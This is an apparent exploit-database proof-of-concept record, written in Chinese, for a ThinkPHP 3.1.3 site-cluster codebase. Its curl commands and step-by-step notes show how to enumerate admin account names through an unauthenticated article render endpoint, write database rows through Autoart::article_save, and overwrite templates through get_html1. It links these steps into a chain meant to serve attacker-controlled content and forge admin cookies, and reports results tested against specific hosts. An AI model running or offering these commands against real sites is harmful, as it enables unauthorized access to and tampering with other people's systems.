# 站群通用：article.ename = 创建者 admin 用户名 + Home/Index::bbs?post=&lt;id&gt; 零凭证渲染点（枚举后台账号名 / 内容可控渲染）

- **code**: 站群通用-article.ename-创建者-admin-用户名-home-index-bbs-post-lt-id-gt-零凭证渲染点-枚举后台账号名-内容可
- **kind**: payload
- **category**: info-leak
- **component**: 站群 ThinkPHP 3.1.3（天花板/聚宝阁/exampleer 同套代码）
- **severity**: medium
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 176：bbs?post=5/10 零凭证渲染 article 且回显作者名（另一路实测）；get_html1 零凭证写模板（本会话实测：模板 342541B→342346B，与 /List/index/type=0 字节一致）；166：Autoart::article_save 零凭证写 article（本会话实测 ids=54 → body "1"）；166 的 bbs/getapp_html/user/kfhtml/selectm 全 404、List/index 恒 365B 存根。
- **path**: pocs/站群通用-article.ename-创建者-admin-用户名-home-index-bbs-post-lt-id-gt-零凭证渲染点-枚举后台账号名-内容可/poc.http
- **tags**: 站群,thinkphp3.1.3,零凭证,渲染点,账号枚举,article_save,get_html1
- **created_at**: 2026-10-13T11:18:22.470Z
- **found_by**: exploit

## 描述

站群通用知识：article.ename 字段 = 创建者 admin 用户名，而 Home/Index::bbs?post=<id> 是零凭证渲染点，可用来枚举后台账号名；配合"零凭证写 article"（Autoart::article_save）或"零凭证写模板"（Home/Order::get_html1）构成完整链。

## 用法

```
枚举账号名：for i in $(seq 1 500); do curl -s "http://TARGET/example.com?g=Home&m=Index&a=bbs&post=$i" -H "Host: <站群域名>" | grep -o '作者[^<]*'; done（提 176 实测：post=5 → 稳赢九肖、post=10 → 花心萝卜）\n写库：curl -s -X POST "http://TARGET/example.com?g=Admin&m=Autoart&a=article_save" -H "Host: <站群域名>" -d "ids=54"\n写模板：curl -s "http://TARGET/example.com?g=Home&m=Order&a=get_html1" -H "Host: <站群域名>"
```

## 正文

```
【零凭证渲染点】GET /example.com?g=Home&m=Index&a=bbs&post=<article_id>  → 200，直接渲染 article 表该行内容，页面「作者:」= $cont['ename']（= 创建者 admin 用户名）。
实测（176）：post=5 → 页面显示「稳赢九肖」；post=10 → 「花心萝卜」。
⇒ 两个推论：① article.ename = 创建者 admin 用户名 ⇒ 可以零凭证枚举出后台全部账号名（用于 cookie 伪造的 admin_user 值 / 登录用户名清单）；② 该接口是「article 内容零凭证渲染点」，若某站能零凭证写 article（如 166 的 Admin/Autoart::article_save），配合此接口即构成"内容可控 + 会渲染"。
【配套写库原语】POST /example.com?g=Admin&m=Autoart&a=article_save  data: ids=<catid> → 200 body "N"（写 N 条 article）；166 上该模块整模块免鉴权可达；176 上 Autoart 全 404（新构建已删）。
【配套写文件/模板原语】GET /example.com?g=Home&m=Order&a=get_html1 → 200 {"ok":1,...}，会把抓取内容写进 App/Tpl/Home/Index_example.com 与 /Upload/atop/jquery3_5.txt|jquery3_6.txt|attime3_5.txt（176 上零凭证可用；166 上该动作 404）。
【注意事项】bbs 在 166 上是 404（166 前台被裁）：166 的 List/index 无论 type 取值恒为 365B 同一份存根，getapp_html/user/kfhtml/selectm 全 404 ⇒ 166 缺少渲染点。
```
